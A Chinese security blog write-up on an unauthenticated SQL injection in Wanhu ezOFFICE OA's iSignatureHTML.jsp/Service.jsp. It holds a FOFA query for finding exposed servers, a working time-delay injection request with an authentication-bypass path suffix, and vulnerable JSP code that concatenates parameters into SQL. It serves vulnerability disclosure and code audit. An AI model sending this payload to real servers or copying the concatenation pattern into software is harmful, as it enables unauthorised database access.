---
title: "万户OA public/iSignatureHTML.jsp/Service.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/defaultroot-ezOFFICE-Service-sqli.html
asset_dir: assets/万户oa-publicisignaturehtml.jspservice.jsp-sql注入漏洞
---

# 万户OA public/iSignatureHTML.jsp/Service.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/1/13 19:10
* 1287浏览
* [0评论](#comment)
* 59分钟阅读

深入探索

软件

Sql

鉴权


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 0x01 产品简介

万户OA [ezoffice](https://mrxn.net/tag/ezoffice "ezoffice") 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公软件产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。

SQL注入检测工具

# 0x02 漏洞概述

万户 ezOFFICE public/iSignatureHTML.jsp/Service.jsp 接口存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，未授权的攻击者可利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")获取数据库权限，深入利用可获取服务器权限。

# 0x03 复现环境

本地环境 OR FOFA：app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"

# 漏洞复现

```
GET /defaultroot/public/iSignatureHTML.jsp/Service.jsp;.js?COMMAND=SAVESIGNATURE&DOCUMENTID=1&EXTPARAM=1&SIGNATURE=1&SIGNATUREID='waitfor+delay'0:0:4'--&USERNAME=admin+HTTP/1.1
Host: ezoffice.mrxn.net
```

成功延时 4 秒

代码安全审计

[[![万户OA public/iSignatureHTML.jsp/Service.jsp SQL注入漏洞](images/img-001-4e7a28070ad0.png)](https://mrxn.net/content/uploadfile/202501/60991736766847.png)](https://mrxn.net/content/uploadfile/202501/60991736766847.png)

# 漏洞分析

> 关于鉴权绕过，参考这篇文章：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)

public/iSignatureHTML.jsp/Service.jsp 主要业务逻辑代码如下，非常简单！

## SAVESIGNATURE

```
<%
    mCommand=request.getParameter("COMMAND");
    mUserName=new String(request.getParameter("USERNAME").getBytes("8859_1"));
    mExtParam=new String(request.getParameter("EXTPARAM").getBytes("8859_1"));
......
if(mCommand.equalsIgnoreCase("SAVESIGNATURE")){        //保存签章数据信息
mDocumentID=new String(request.getParameter("DOCUMENTID").getBytes("8859_1"));
mSignatureID=new String(request.getParameter("SIGNATUREID").getBytes("8859_1"));
mSignature=new String(request.getParameter("SIGNATURE").getBytes("8859_1"));
//System.out.println("Signature:"+mSignature);
if (ObjConnBean.OpenConnection()){
      strSql="SELECT * from HTMLSignature Where SignatureID='"+mSignatureID+"' and DocumentID='"+mDocumentID+"'";
    ResultSet rs = null;
    rs = ObjConnBean.ExecuteQuery(strSql);
    if (rs.next()) {
       strSql = "update HTMLSignature set DocumentID='"+mDocumentID+"',SIGNATUREID='"+mSignatureID+"',Signature='"+mSignature+"'";
       strSql = strSql + "  Where SignatureID='"+mSignatureID+"' and DocumentID='"+mDocumentID+"'";
       ObjConnBean.ExecuteUpdate(strSql);
    }else{
       java.sql.PreparedStatement prestmt=null;
       try{
            //取得唯一值(mSignature)
          java.util.Date dt=new java.util.Date();
          long lg=dt.getTime();
          Long ld=new Long(lg);
          mSignatureID=ld.toString();
          String Sql="insert into HTMLSignature (DocumentID,SignatureID,Signature) values (?,?,?) ";             
          prestmt=ObjConnBean.Conn.prepareStatement(Sql);
          prestmt.setString(1, mDocumentID);
          prestmt.setString(2, mSignatureID);
          prestmt.setString(3, mSignature);

          ObjConnBean.Conn.setAutoCommit(true);
          prestmt.execute();
          //ObjConnBean.Conn.commit();
          prestmt.close();
          mResult=true;
       }
       catch(SQLException e){
          System.out.println("保存签章错误:"+e.toString());
          mResult=false;
       }
    }
ObjConnBean.CloseConnection();
}
out.clear();
out.print("SIGNATUREID="+mSignatureID+"\r\n");
out.print("RESULT=OK");
```

如果 `COMMAND` 等于 `SAVESIGNATURE`，则直接将 `DOCUMENTID`、`SIGNATUREID` 拼接进SQL语句，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，就是这么朴实无华！

漏洞预警服务

同时其他几处也存在类似的问题

## DELESIGNATURE

```
if(mCommand.equalsIgnoreCase("DELESIGNATURE")){   //删除签章数据信息
    mDocumentID=request.getParameter("DOCUMENTID");
    mSignatureID=request.getParameter("SIGNATUREID");
       if (ObjConnBean.OpenConnection()){
          strSql="SELECT * from HTMLSignature Where SignatureID='"+mSignatureID+"' and DocumentID='"+mDocumentID+"'";
       ResultSet rs=null;
       rs = ObjConnBean.ExecuteQuery(strSql);
       if(rs.next()){
          try{
             strSql="DELETE from HTMLSignature Where SignatureID='"+mSignatureID+"' and DocumentID='"+mDocumentID+"'";
             ObjConnBean.ExecuteUpdate(strSql);
          }
          catch(Exception ex){
             out.println(ex.toString());
          }
       }
       ObjConnBean.CloseConnection();
       }
    out.clear();
    out.print("RESULT=OK");
}
```

## LOADSIGNATURE

```
if(mCommand.equalsIgnoreCase("LOADSIGNATURE")){    //调入签章数据信息
    mDocumentID=request.getParameter("DOCUMENTID");
    mSignatureID=request.getParameter("SIGNATUREID"); 

    mDocumentID=com.whir.component.security.crypto.EncryptUtil.sqlcode(mDocumentID);
    mSignatureID=com.whir.component.security.crypto.EncryptUtil.sqlcode(mSignatureID);

    if (ObjConnBean.OpenConnection()){
       strSql="SELECT * from HTMLSignature Where SignatureID='"+mSignatureID+"' and DocumentID='"+mDocumentID+"'";
       ResultSet rs=null;
       rs = ObjConnBean.ExecuteQuery(strSql);
       if(rs.next()){
          mSignature=rs.getString("Signature");
       }
       ObjConnBean.CloseConnection();
    }
    out.clear();
    out.print(mSignature+"\r\n"); 
    out.print("RESULT=OK");
}
```

## SHOWSIGNATURE

```
if(mCommand.equalsIgnoreCase("SHOWSIGNATURE")){   //获取当前签章SignatureID，调出SignatureID，再自动调LOADSIGNATURE数据
    mSignatures="";
    mDocumentID=request.getParameter("DOCUMENTID");  
    mDocumentID=com.whir.component.security.crypto.EncryptUtil.sqlcode(mDocumentID);
       if (ObjConnBean.OpenConnection()){
          strSql="SELECT * from HTMLSignature Where DocumentID='"+mDocumentID + "'";
       ResultSet rs=null;
       rs = ObjConnBean.ExecuteQuery(strSql);
       while(rs.next()){
          mSignatures=mSignatures+rs.getString("SignatureID")+";";
       }
       ObjConnBean.CloseConnection();
       }
    out.clear(); 
    out.print("SIGNATURES="+mSignatures+"\r\n");
    out.print("RESULT=OK");
}
```

## GETSIGNATUREDATA

```
if(mCommand.equalsIgnoreCase("GETSIGNATUREDATA")){           //批量签章时，获取所要保护的数据

   String mSignatureData="";
    mDocumentID=request.getParameter("DOCUMENTID");
       System.out.println(new String(request.getParameter("FIELDSLIST").getBytes("8859_1")) );
       System.out.println(request.getParameter("FIELDSNAME"));
       if (ObjConnBean.OpenConnection()){
          strSql="SELECT XYBH,BMJH,JF,YF,HZNR,QLZR,CPMC,DGSL,DGRQ  from HTMLDocument Where DocumentID='"+mDocumentID + "'";
       ResultSet rs=null;
       rs = ObjConnBean.ExecuteQuery(strSql);
```

# 最后

其他万户OA 相关漏洞  
[万户 ezOFFICE selectAmountField.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-selectAmountField-sqli.html)  
[万户OA系列漏洞](https://mrxn.net/tag/ezoffice)

营销

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#ezOFFICE](https://mrxn.net/tag/ezOFFICE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.0x01 产品简介](#toc-1-)
* [2.0x02 漏洞概述](#toc-2-)
* [3.0x03 复现环境](#toc-3-)
* [4.漏洞复现](#toc-4-)
* [5.漏洞分析](#toc-5-)
* [5.1.SAVESIGNATURE](#toc-5-1-)
* [5.2.DELESIGNATURE](#toc-5-2-)
* [5.3.LOADSIGNATURE](#toc-5-3-)
* [5.4.SHOWSIGNATURE](#toc-5-4-)
* [5.5.GETSIGNATUREDATA](#toc-5-5-)
* [6.最后](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[万户OA public/iSignatureHTML.jsp/Service.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-Service-sqli.html)  
文章链接：<https://mrxn.net/jswz/defaultroot-ezOFFICE-Service-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读

物流软件安全


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/defaultroot-ezOFFICE-Service-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALXElEQVR4AeycjVbkuA6E+fb933kvldpyFMVON8NPc8+Eg7qkUkk2VgwNu2f+eXt7+/dP7d/28UyfVrKFz9Q9o9malZermiLb3CttcpuwvIQXhpb/GdNA3uvvz99yAmMg7xN+e9b65oE34ECn14FcBNF2XMg3umsVA4d9iFsZHLVb0/eXqn8Pt89wW/D+Aq4NL3ynD5/inrVaOAZSydt/3QmcBgKePpzx0TbrEwGuD5daMA+EegpXfWpx1yQHHG6O+JVWuW5wru+aVQyuhTPOak4DmYlu7udO4NsG0p/AHtcvEc5PD3D4mRZ97wN7bTQde43ysNfBvpZysVldckLYeyj+Cvu2gXzF5v7GHt8+EPBTdHW4eRKDV1pY9wPnwHjVJ2sF4VwD5q40V2v8Se7bB/Inm/qba75nIH/ziX7yaz8NJNdzhh9ZC47XfVYL1sARs/asJlw0M4ymI+zr9NwsTu/kEs8wmo4zbbiuVXwaiMjbXncCYyCwPz1w7f/JdsE983QI00e+LHEQXAOEOiGw/dIHnHIhgE2jNWJgLpoZwlED8xg4lQPbmvAYa/EYSCVv/3Un8E+emD/BbDu1iYUzTvyVpQb8VCUWgrler1ys567i1MC8b62FowYcp4cwevmfsfuG5CR/CZ4GAp7+bH/gHMyx1oA1let+niSwFowzvteCtXDGrk2/yoPrkgtWTfzkOiYvBPeTLwPH8Bilj50GksSNrzmBMRDwJPMUzLaTXDCaxOAeQFLjncaVZoj/c4CtLjUz/E86heiTBPeDHaMBczNtuI5wrFE+/eRXC3+FVT8GUslf6v8V27oH8svG/A/4+u